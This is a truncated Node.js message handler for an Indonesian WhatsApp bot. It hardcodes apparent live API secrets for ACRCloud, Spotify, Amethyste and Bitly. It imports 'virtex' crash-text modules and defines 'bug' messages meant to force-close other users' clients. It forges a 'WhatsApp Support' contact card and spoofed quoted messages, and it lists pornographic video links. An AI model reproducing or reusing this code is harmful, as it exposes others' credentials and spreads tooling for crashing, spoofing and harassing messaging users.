"use strict";
const chalk = require('chalk')
const fs = require("fs")
const toMs = require('ms')
const fse = require('fs-extra');
const ra = require("ra-api");
const moment = require("moment-timezone");
const util = require("util");
const { exec, spawn } = require("child_process");
const ffmpeg = require("fluent-ffmpeg");
const axios = require("axios");
const hxz = require("hxz-api");
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI()
const yts = require("yt-search");
const speed = require("performance-now");
const request = require("request");
const ms = require("parse-ms");
const ytdl = require('ytdl-core');
const os = require('os');
const { performance } = require('perf_hooks')
const imageToBase64 = require('image-to-base64');
const fetch = require('node-fetch');
const acrcloud = require("acrcloud");
const acr = new acrcloud({
host: "identify-eu-west-1.acrcloud.com",
access_key: "c9f2fca5e16a7986b0a6c8ff70ed0a06",
access_secret: "PQR9E04ZD60wQPgTSRRqwkBFIWEZldj0G3q7NJuR"
});
const Download = require("@phaticusthiccy/open-apis");
const { SoundCloud } = require("scdl-core");
const CuteFFMPEG = require("cute-ffmpeg").CuteFFMPEG;
const FFMPEGRequest = require("cute-ffmpeg").FFMPEGRequest;
const Ffmpeg = new CuteFFMPEG({
overwrite: true
});
const Spotify = require('spotifydl-core').default
const spotify = new Spotify({
clientId: 'acc6302297e040aeb6e4ac1fbdfd62c3',
clientSecret: '0e8439a1280a43aba9a5bc0a16f3f009'
}) 
const hx = require("hxz-api")
const convert = require('imagemagick')
const gis = require('g-i-s');
const { youtubeSearch, mediafiredl, lyricsv2, lyrics, facebookdl, facebookdlv2, tiktokdl, tiktokdlv2, twitterdl, twitterdlv2, getZodiac, liputan6, googleIt, wallpaperv2, googleImage, jadwalTVNow, gempa, stickerTelegram, stickerLine, latinToAksara, aksaraToLatin, asmaulhusna, asmaulhusnajson, alquran, jadwalsholat, listJadwalSholat, gempaNow } = require('@bochilteam/scraper')
const ameClient = require("amethyste-api")
const ameApi = new ameClient("1f486b04b157f12adf0b1fe0bd83c92a28ce768683871d2a390e25614150d0c8fa404fd01b82a5ebf5b82cbfa22e365e611c8501225a93d5d1e87f9f420eb91b")
const { BitlyClient } = require('bitly');
const bitly = new BitlyClient('7d737131e678fc366699edead8bca146e69f6c78', {});
//================================================================================\\
const { msgFilter, addSpam, unSpam, SpamExpired, cekSpam} = require('./lib/antispam')
const { color, bgcolor } = require('./lib/color')
const { WAMessageStubType, generateWAMessageFromContent, downloadContentFromMessage, downloadHistory, proto, getMessage, generateWAMessageContent, prepareWAMessageMedia , generateWAMessage, areJidsSameUser,downloadMediaMessage, makeInMemoryStore } = require("./lib/woker/@adiwajshing/baileys")
const { addInventoriLimit, checkDataLimit, kurangLimit, tambahLimit, getLimit } = require("./lib/limit");
const { pinterest } = require("./lib/pinterest")
const { formatp, getCase, kyun, isUrl, fetchJson, fetchText, getGroupAdmins, sleep, getBuffer, FileSize, weton,week,calender,dateIslamic,formatDate, makeid, generateMessageTag, runtime, randomNomor, jsonformat, generateProfilePicture, h2k, generateMessageID, getRandom } = require('./lib/functions')
const textpro = require('./lib/textpro')
const { antivirus } = require('./lib/antivirus.js')
const { TelegraPh } = require('./lib/uploader')
const { ghstalk,facebook, kodepos, moddroid, apkmody, happymod, wallpaper, wikimedia, quotesAnime, aiovideodl  } = require('./lib/scraper') 
const { addblockcmd, deleteblockcmd, checkblockcmd } = require("./lib/blockcmd");
const { clearAllBan, addBanned, unBanned, cekBannedUser } = require("./lib/banned")
const { addError,clearAllError, deleteError, checkError } = require("./lib/totalerror")
const { clearAllOwner, clearAllPremium, getDateId, clearAllUser, gethitUser, resetLevelingXp, userXp, userLeveling, getLevelingXp, getLevelingLevel, getLevelingId, addLevelingXp, addLevelingLevel, addUserId, checkHit, AddHit } = require("./lib/user");
const { Nothing, Failed, Succes, addAutoClear, autoClearChat, checkAutoClear, checkDataName, createDataId, getDataId, addDataId, removeDataId, checkDataId, checkClaim, getClaim, expiredClaim, addUserClaim, getHit, cmdAdd, expiredCmd } = require("./lib/totalcmd");
const { addBlock, unBlock, cekBlock } = require("./lib/blockuser");
const { tebakkimia, asahotak, susunkata, tebakkalimat, tekateki, caklontong, tebakbendera, tebakanime, tebakkabupaten, tebaklagu, tebaklirik } = require('./lib/index.js') 
const { addInventoriDarah, cekDuluJoinAdaApaKagaDiJson, addDarah, kurangDarah, getDarah } = require('./lib/darah.js')
const { cekInventoryAdaAtauGak, addInventori, addBesi, addEmas, addEmerald, addUmpan, addPotion, kurangBesi, kurangEmas, kurangEmerald, kurangUmpan, kurangPotion, getBesi, getEmas, getEmerald, getUmpan, getPotion } = require('./lib/alat_tukar.js')
const { addInventoriMonay, cekDuluJoinAdaApaKagaMonaynyaDiJson, addMonay, kurangMonay, getMonay } = require('./lib/monay.js')
const { cekDuluHasilBuruanNya, addInventoriBuruan, addIkan, addAyam, addKelinci, addDomba, addSapi, addGajah, kurangIkan, kurangAyam, kurangKelinci, kurangDomba, kurangSapi, kurangGajah, getIkan, getAyam, getKelinci, getDomba, getSapi, getGajah } = require('./lib/buruan.js')  
//================================================================================\\
const { virtex1, virtag, philip, emoji1, emoji2, virtex2, virtex3, virtex4, virtex5, virtex8, virtex9, virtex10, virtex11, virtex12, slayer, ngazap, virtexbytsukasa } = require('./virtex/virtex.js')
const { virtex6 } = require('./virtex/virtex6.js')
const { virtex7 } = require('./virtex/virtex7.js')
const { ngazapv1 } = require('./virtex/ngazapv1') 
const { ngazapv2 } = require('./virtex/ngazapv2') 
const { ngazapv3 } = require('./virtex/ngazapv3')
//================================================================================\\
const replay = (teks) => {
  Fan.relayMessage(m.chat, { requestPaymentMessage: { noteMessage: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
}
//================================================================================\\
const { menu1, fitur1 } = require('./message/menu1')
const { menu2, fitur2 } = require('./message/menu2')
const { menu3, fitur3 } = require('./message/menu3')
const { spam1, spam2, istigfar, hanyaadmin, jadiinadmin, ucapsalam, samasama, kumsalam, khususowner, katakasar } = require("./message/stickerPack.js");
const { bad, menu, tekssalah, katahai, katamalem, katasiang, katasore, katalopyou, tekscmd, teksspam, ilhamberkata, ngebucin, badud, ohayo, salam, thanks, anime, dosa, devoloper1, devoloper2} = require("./message/message.js");
const { ucapsalamikum, enggakmau, ucapmalam, ucapsiang, ucappagi, botz, unregister, ucaphai, toxicbro, spamnih, loplop, sangebro } = require("./message/vn")
//================================================================================\\
const Exif = require("./lib/exif")
const exif = new Exif()
//================================================================================\\
const oawalah =['iya kak ?','Ada apa kak ?','Bot aktif kak','Aku bukan bot kak, aku ini hooman','Kumaha atuh kak ?','Kunaon kak ?','oy ?','ya ?','Kenapa panggil aku','Ada apa kak kok panggil aku','Naon siah kehed manggil manggil']
const hayuk = oawalah[Math.floor(Math.random() * oawalah.length)] 
const b1 = ["pukulin","kocok"]
const bully1 = b1[Math.floor(Math.random() * b1.length)]
const b2 = ["gebukin","santet"]
const bully2 = b2[Math.floor(Math.random() * b2.length)]
const b3 = ["sayang","peluk"]
const bully3 = b3[Math.floor(Math.random() * b3.length)]
const randombokep = ["https://d.top4top.io/m_23276fn4k0.mp4","https://e.top4top.io/m_2327lpyjx1.mp4","https://f.top4top.io/m_2327ecxse2.mp4","https://g.top4top.io/m_2327s1vkm3.mp4","https://i.top4top.io/m_232707qxd5.mp4","https://j.top4top.io/m_2327d16ad6.mp4","https://k.top4top.io/m_2327cwvt27.mp4","https://l.top4top.io/m_2327t08r98.mp4","https://h.top4top.io/m_2327kv7dk4.mp4","https://b.top4top.io/m_2328yetob0.mp4","https://b.top4top.io/m_2328yetob0.mp4","https://c.top4top.io/m_23282ag451.mp4","https://d.top4top.io/m_2328uck8k2.mp4","https://e.top4top.io/m_232818z043.mp4","https://l.top4top.io/m_23289plkq0.mp4","https://a.top4top.io/m_23281toko1.mp4","https://b.top4top.io/m_23285rxky2.mp4","https://c.top4top.io/m_2328liezp3.mp4","https://d.top4top.io/m_2328mh11a4.mp4","https://e.top4top.io/m_2328jvc1u5.mp4","https://f.top4top.io/m_23282xa0e6.mp4","https://g.top4top.io/m_2328p9c7o7.mp4","https://g.top4top.io/m_2328q19nl0.mp4","https://h.top4top.io/m_2328ljgut1.mp4","https://i.top4top.io/m_23286c8712.mp4","https://j.top4top.io/m_2328qqgb53.mp4","https://k.top4top.io/m_2328ktj4r4.mp4"]
const bokep = randombokep[Math.floor(Math.random() * randombokep.length)]  
const randomcok = ['XM1','XM2','XM3']
const randomfoto = randomcok[Math.floor(Math.random() * (randomcok.length))]
const ofrply = fs.readFileSync(`./media/image/XM1.jpg`) 
const dfrply = fs.readFileSync(`./media/image/thumbnaildokumen.jpg`) 
//================================================================================\\
const AntiSpam = JSON.parse(fs.readFileSync('./database/antispam.json'));
const DataId = JSON.parse(fs.readFileSync('./database/data.json'))
const Own = JSON.parse(fs.readFileSync('./database/owner.json'))
const listcmdblock = JSON.parse(fs.readFileSync('./database/blockcmd.json'))
const ban = JSON.parse(fs.readFileSync('./database/banned.json'))
const listerror = JSON.parse(fs.readFileSync('./database/listerror.json'))
const setiker = JSON.parse(fs.readFileSync('./database/stick.json'))
const audionye = JSON.parse(fs.readFileSync('./database/vn.json'))
const user = JSON.parse(fs.readFileSync('./database/user.json'))
const _buruan = JSON.parse(fs.readFileSync('./database/hasil_buruan.json'));
const hitnya = JSON.parse(fs.readFileSync('./database/hitToday.json'))
const _claim = JSON.parse(fs.readFileSync('./database/claim.json'))
const blocked = JSON.parse(fs.readFileSync('./database/userblocked.json'))
const dash = JSON.parse(fs.readFileSync('./database/dashboard.json'))
const anonChat = JSON.parse(fs.readFileSync('./database/anonymous.json'))
const Premium = JSON.parse(fs.readFileSync('./database/premium.json'))
const spammer = []
//================================================================================\\
const _tbkkimia = JSON.parse(fs.readFileSync('./database/game/tebakkimia.json'))
const _asahotak = JSON.parse(fs.readFileSync('./database/game/asahotak.json'))
const _susunkata = JSON.parse(fs.readFileSync('./database/game/susunkata.json'))
const _tebakkalimat = JSON.parse(fs.readFileSync('./database/game/tebakkalimat.json'))
const _tekateki = JSON.parse(fs.readFileSync('./database/game/tekateki.json'))
const _caklontong = JSON.parse(fs.readFileSync('./database/game/caklontong.json'))
const _tebakbendera = JSON.parse(fs.readFileSync('./database/game/tebakbendera.json'))
const _tebakanime = JSON.parse(fs.readFileSync('./database/game/tebakanime.json'))
const _tebakkabupaten = JSON.parse(fs.readFileSync('./database/game/tebakkabupaten.json'))
const _tebaklirik= JSON.parse(fs.readFileSync('./database/game/tebaklirik.json'))
const _tebaklagu= JSON.parse(fs.readFileSync('./database/game/tebaklagu.json'))
//================================================================================\\
/*           Recodenya yang teliti ya sayang                                                                              */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
/*           ntar klo error jangan salahin gua                                                  */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            let Owneren = `${nomerOwner}@s.whatsapp.net`
//================================================================================\\
module.exports = async(Fan, mek, m, store) => {
try {
const { type, now, fromMe } = mek
const Id =  mek.key.id
const antibot = mek.isBaileys
const content = JSON.stringify(mek.message)
const from  = mek.key.remoteJid
const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
const body = (type === 'conversation') ? mek.message.conversation : (type == 'imageMessage') ? mek.message.imageMessage.caption : (type == 'videoMessage') ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedButtonId : (type == 'listResponseMessage') ? mek.message.listResponseMessage.singleSelectReply.selectedRowId : (type == 'templateButtonReplyMessage') ? mek.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (mek.message.buttonsResponseMessage?.selectedButtonId || mek.message.listResponseMessage?.singleSelectReply.selectedRowId ) : ''
const pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
const messagesD = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
const messagesC = pes.slice(0).trim()


if (multi){
var prefix = /^[°zZ#@+,.?=''():√%!¢£¥€π¤ΠΦ&<`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#@+,.?=''():√%¢£¥€π¤ΠΦ&<!`™©®Δ^βα¦|/\\©^]/gi) : '.'
var thePrefix = "Multi Prefix"
} else if (nopref){
var  prefix = ''
var thePrefix ="No prefix"
} else if (allpref){
var prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : ''
var thePrefix ="All Prefix"
} else {
prefix = prefa
var thePrefix = prefa
}



const budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
const selectedButton = (type == 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedButtonId : ''
const responseButton = (type == 'listResponseMessage') ? mek.message.listResponseMessage.title : ''                        
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const isCmd = body.startsWith(prefix)
const q = args.join(' ')
const c = args.join(" ")
const timeWib = moment().tz('Asia/Jakarta').format('HH:mm:ss')
const timeWit= moment().tz('Asia/Makassar').format('HH:mm:ss')
const timeWita = moment().tz('Asia/Jayapura').format('HH:mm:ss')
const botNumber = Fan.user.id ? Fan.user.id.split(":")[0]+"@s.whatsapp.net" : Fan.user.id
const isGroup = from.endsWith('@g.us')
const sender = isGroup ? (mek.key.participant ? mek.key.participant : mek.participant) : mek.key.remoteJid
const senderNumber = sender.split("@")[0] 
const Ownerin = devoloper1? devoloper1 : devoloper2? devoloper2 : false
const ownerNumber = Ownerin? Ownerin : Owneren? Owneren : false
const isDev = ownerNumber.includes(sender)
const isOwn = Own.includes(sender)
const theOwner = sender == Ownerin
const totalchat = await store.chats.all().map(v => v.id)
const totalGroup = totalchat.filter(v => v.endsWith('g.us'))
const groupMetadata = isGroup ? await Fan.groupMetadata(from) : ""
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.jid : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupDesc = isGroup ? groupMetadata.desc : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const pushname = mek.pushName || "No Name"
const chatss = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
const forward = { forwardingScore: 10000000, isForwarded: true, sendEphemeral: true}
const text = args.join(" ")
const timestampp = speed();
const latensi = speed() - timestampp
const arg = budy.slice(command.length + 2, budy.length)
const itsMe = mek.key.fromMe
const mentionByTag = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.mentionedJid : []
const mentionByReply = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.participant || "" : ""
const quoted = mek.quoted ? mek.quoted : mek
const mime = (quoted.msg || quoted).mimetype || ''
const users = mentionByReply? mentionByReply : mentionByTag[0]
const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
mention != undefined ? mention.push(mentionByReply) : []
const mentionUser = mention != undefined ? mention.filter(n => n) : []
const isHit = checkHit(senderNumber, user)   
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const numberQuery = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
const Pe = mentionByTag[0]? mentionByTag[0] : mentionByReply ? mentionByReply : q? numberQuery : false
const isMiminya = Own.includes(Pe)
const isPremnya = Premium.includes(Pe)
const isOwner = isDev? isDev : isOwn? isOwn : false
const isLimit = kurangLimit(sender, 1)
//===============================================================================\\
const userLevel = getLevelingLevel(senderNumber, user)
const userExp = getLevelingXp(senderNumber, user)
const userId = getLevelingId(senderNumber, user)
const amountExp = Math.floor(Math.random() * 10) + 50
const requiredExp = 1000 * userLevel
const userPersen = userExp/requiredExp*100
const userVerified = getDateId(senderNumber, user) 
//================================================================================\\
require("./message/mess.js")(senderNumber, prefix,command)
//================================================================================\\
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupOwner = isGroup ? groupOwner == sender : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isUserLimit = checkDataLimit(sender)
const isAntiLink = checkDataId("antilink", from, DataId) 
const isAntiVirtex = checkDataId("antivirtex", from, DataId) 
const isKickarea = checkDataId("antiasing", from, DataId) 
const isAntilinkGc = checkDataId("antilinkgc", from, DataId) 
const isBanchat = checkDataId("banchat", from, DataId) 
const isAntihidetag = checkDataId ("antihidetag", from, DataId) 
const isPremium = isOwner ? true : Premium.includes(sender)
const isDevoloper = isPremium? isPremium : itsMe? itsMe : false
//================================================================================\\
const DarahAwal = rpg.darahawal
const isDarah = cekDuluJoinAdaApaKagaDiJson(sender)   
const isCekDarah = getDarah(sender)
const isUmpan = getUmpan(sender)
const isPotion = getPotion(sender)
const isIkan = getIkan(sender)
const isAyam = getAyam(sender)
const iskelinci = getKelinci(sender)
const isDomba = getDomba(sender)
const isSapi = getSapi(sender)
const isGajah = getGajah(sender)
const isMonay = getMonay(sender)
const isBesi = getBesi(sender)
const isEmas = getEmas(sender)
const isEmerald = getEmerald(sender)
const isInventory = cekInventoryAdaAtauGak(sender)
const isInventoriBuruan = cekDuluHasilBuruanNya(sender)
const isInventoryLimit = checkDataLimit(sender)
const isInventoryMonay = cekDuluJoinAdaApaKagaMonaynyaDiJson(sender)
const ikan = ['🐟','🐠','🐡']   

//================================================================================\\  
const roomChat = Object.values(anonChat).find(room => [room.a, room.b].includes(m.sender) && room.state == 'CHATTING')
const roomA = Object.values(anonChat).find(room => room.a == m.sender)
const roomB = Object.values(anonChat).find(room => room.b == m.sender )
const room = Object.values(anonChat).find(room => room.state == 'WAITING' && room.b == "")     
//================================================================================\\
const iyakak = botz[Math.floor(Math.random() * botz.length)]              
const ucapbot = fs.readFileSync(iyakak)

//Vn saat command tidak ditemukan
const unreg = unregister[Math.floor(Math.random() * unregister.length)]              
const gakada = fs.readFileSync(unreg)

//Vn saat ada yang sange
const lusange = sangebro[Math.floor(Math.random() * sangebro.length)]              
const sangeya = fs.readFileSync(lusange)

//VN saat ada yang toxic
const anying = toxicbro[Math.floor(Math.random() * toxicbro.length)]              
const astaga = fs.readFileSync(anying)

//VN saat ada yg akses fitur owner
const ahenggak = enggakmau[Math.floor(Math.random() * enggakmau.length)]              
const gakmau = fs.readFileSync(ahenggak)

//VN saat ada yg bilang selamat pagi
const ay = ucappagi[Math.floor(Math.random() * ucappagi.length)]
const oahyo = fs.readFileSync(ay)

//VN saat ada yg bilang selamat malam
const ayuk = ucapmalam[Math.floor(Math.random() * ucapmalam.length)]
const oyasumi = fs.readFileSync(ayuk)

//VN saat ada yg bilang selamat siang
const yayuk = ucapsiang[Math.floor(Math.random() * ucapsiang.length)]
const koniciwa = fs.readFileSync(yayuk)

//VN saat ada yg spam
const alal = spamnih[Math.floor(Math.random() * spamnih.length)]
const nospam = fs.readFileSync(alal)

//VN saat ada yg bilang halo
const ulul = ucaphai[Math.floor(Math.random() * ucaphai.length)]
const moshimos = fs.readFileSync(ulul)

//VN saat ada yg bilang asalamualaikum
const alul = ucapsalamikum[Math.floor(Math.random() * ucapsalamikum.length)]
const walaikumsalam = fs.readFileSync(alul)

//VN saat ada yg bilang i love u
const awlu = loplop[Math.floor(Math.random() * loplop.length)]
const lopyoutoo = fs.readFileSync(awlu) 

const textcmd = tekscmd[Math.floor(Math.random() * tekscmd.length)]                         
const textspam = teksspam[Math.floor(Math.random() * teksspam.length)]                         
//================================================================================\\
Fan.sendReadReceipt(from, sender, [mek.key.id])
if (isCmd){
Fan.sendPresenceUpdate('composing', from)
} else {
Fan.sendPresenceUpdate('available', from)
}
//================================================================================\\
// image Pake Pp Org
try {
var ppimg = await Fan.profilePictureUrl(sender, 'image')
} catch (err) {
console.log(err)
var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
const thumb = await getBuffer(ppimg)
//================================================================================\\
if(timeWib < "23:59:00"){ var ucapanWaktu = 'Selamat malam' }
if(timeWib < "19:00:00"){ var ucapanWaktu = 'Selamat malam'}
if(timeWib < "18:00:00"){ var ucapanWaktu = 'Selamat sore'}
if(timeWib < "15:00:00"){ var ucapanWaktu = 'Selamat siang'}
if(timeWib < "11:00:00"){ var ucapanWaktu = 'Selamat pagi'}
if(timeWib < "06:00:00"){ var ucapanWaktu = 'Selamat pagi'  }       
//================================================================================\\
const ftoko = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {"productMessage": {"product": {"productImage":{"mimetype": "image/jpeg","jpegThumbnail": thumb},"title": `${pushname}`,"description": `${ucapanWaktu} kak`,"currencyCode": "IDR", "priceAmount1000": `${pushname}`, "retailerId": `Rp10`,"productImageCount": 1},"businessOwnerJid": `0@s.whatsapp.net`}}}
const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `0@s.whatsapp.net` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': thumb}}}
const ftext = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${botName}`,"title": `Hmm`,'jpegThumbnail': thumb}}}
const ftroli = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {orderMessage: {itemCount : 200, status: 1,surface : 2,message: `${botName}\n${ucapanWaktu} kak`,orderTitle: `${ucapanWaktu} kak`,thumbnail: thumb, sellerJid: `0@s.whatsapp.net`}}}
const floc = { key: {"fromMe": false,"participant": `0@s.whatsapp.net`, "remoteJid": "6289530863358-1621036495@g.us" },message: { "liveLocationMessage": { "title":`${botName}`,'jpegThumbnail': thumb}}}
const fimage = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: {"imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": botName, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": thumb, "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
const fdoc = { key : { participant : '0@s.whatsapp.net'}, message: { documentMessage: { title: 'Halo bang', jpegThumbnail: thumb}}}
const fvid = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":"hallo bang","h": `Hmm`,'seconds': '30', 'caption': 'Halo bang','jpegThumbnail': thumb}}}
const fgc = {"key": {"fromMe": false,"participant": "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "mememteeeekkeke","groupName": "P", "caption": "Halo bang jagoo", 'jpegThumbnail': thumb}}}
const fgif = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: {  "videoMessage": {  "title":"Lol Lexxy+", "h": `Hmm`, 'seconds': "30",  'gifPlayback': 'true',  'caption': 'Lol Lexxy+', 'jpegThumbnail': thumb}}} 
const fvn = {key: { fromMe: false,participant: `62882000383955@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds": "30","ptt": "true"}}}
//================================================================================\\
const bugquoted = { key: { fromMe: true, participant: `6285870017326@s.whatsapp.net`, ...({ remoteJid: "" }) }, message: { "imageMessage": { "mimetype": "image/jpeg", "caption": `Crash Infinity!!`, "jpegThumbnail": thumb}}}
const bugfc = {key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) }, message: { "imageMessage": { "mimetype": "image/jpeg", "caption": `Kok Fc Bang`, "jpegThumbnail": thumb}}}
const bugkon = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },"message": {"contactMessage": {"displayName": "WhatsApp Support","vcard": "BEGIN:VCARD\nVERSION:3.0\nN:Support;WhatsApp;;;\nFN:WhatsApp Support\nORG:WhatsApp Support\nTITLE:\nitem1.TEL;waid=6288226703423:+62 882-2670-3423\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-NAME:WhatsApp Support\nEND:VCARD"}}}
//================================================================================\\
if(Qoted === "ftoko"){
var setQuoted = ftoko
} else if(Qoted === "fkontak"){
var setQuoted = fkontak
} else if(Qoted === "ftext"){
var setQuoted = ftext
}else if(Qoted === "ftroli"){
var setQuoted = ftroli
} else if(Qoted === "floc"){
var setQuoted = floc
} else if(Qoted === "fimage"){
var setQuoted = fimage
} else if(Qoted === "fdoc"){
var setQuoted = fdoc
} else if(Qoted === "fvid"){
var setQuoted = fvid
} else if(Qoted === "fgc"){
var setQuoted = fgc
} else if(Qoted === "fgif"){
var setQuoted = fgif
} else if(Qoted === "fvn"){
var setQuoted = fvn
} else if(Qoted === "mek"){
var setQuoted = mek
}
//================================================================================\\
const setReply = async(teks) =>{ 
if(!orquoted && replyType === "web2"){
Fan.sendMessage(from, { contextInfo: { externalAdReply:{ showAdAttribution: true, title: `hallo kak👋 ${pushname}`,body:'DONT CLICK HERE',previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${nomerOwner}?text=${textreply}`}}, text: teks },{quoted: setQuoted})
} else if(orquoted && replyType === "web2"){
Fan.sendMessageV2(from, { contextInfo: { externalAdReply:{ showAdAttribution: true, title: `hallo kak👋 ${pushname}`,body:'DONT CLICK HERE',previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${nomerOwner}?text=${textreply}`}}, text: teks },{quoted: setQuoted})
} else if(!orquoted && replyType === "web"){
Fan.sendMessage(from, { contextInfo: { forwardingScore: 9999, isForwarded: true, showAdAttribution: true, externalAdReply:{title: `hallo kak👋 ${pushname}`,body:'DONT CLICK HERE',previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${nomerOwner}?text=${textreply}`}},showAdAttribution: true, text: teks }, { showAdAttribution: true, quoted: setQuoted })
} else if(orquoted && replyType === "web"){
Fan.sendMessageV2(from, { contextInfo: { forwardingScore: 9999, isForwarded: true, showAdAttribution: true, externalAdReply:{title: `hallo kak👋 ${pushname}`,body:'DONT CLICK HERE',previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${nomerOwner}?text=${textreply}`}},showAdAttribution: true, text: teks }, { showAdAttribution: true, quoted: setQuoted })
} else if(!orquoted && replyType === "mess"){
Fan.sendMessage(from, {text: teks}, { quoted: setQuoted })
} else if(orquoted && replyType === "mess"){
Fan.sendMessageV2(from, {text: teks}, { quoted: setQuoted })
} else if(replyType === "troli"){
let template = generateWAMessageFromContent(from, {
'orderMessage': {
'orderId': '0@s.whatsapp.net',
'thumbnail': ofrply,
'itemCount': "2022",
'status': 1,
'surface': 1,
'message':teks,
'orderTitle': botName,
'sellerJid': `62887435047326@s.whatsapp.net`,
'token': 'notoken',
}
}, {
'quoted': setQuoted
});
await Fan.relayMessage(from, template.message,{ messageId: template.key.id })                   
} else {
Fan.sendMessage(from, {text: "Error SetReply Tidak Di Temukan"})
}
}
//================================================================================\\
const Sendbutdocument = async(id, text1, desc1, gam1, but = [], options = {}) => {	
const buttonMessage = {
contextInfo: options,
document: fs.readFileSync('./media/document/file.docx'),
mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document", 
title : "Footer text", 
fileLength : 999999999999, 
pageCount: 100, 
fileName : botName, 
caption: text1,
footer: desc1,
buttons: but,
headerType: "DOCUMENT"
}

await Fan.sendMessage(id, buttonMessage,options)
} 
 


// Public & Self
if (!publik) {
if (!itsMe && !isOwner && !theOwner) return
}

// Bot Status
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
 })
const cpu = cpus.reduce((last, cpu, _, { length }) => {
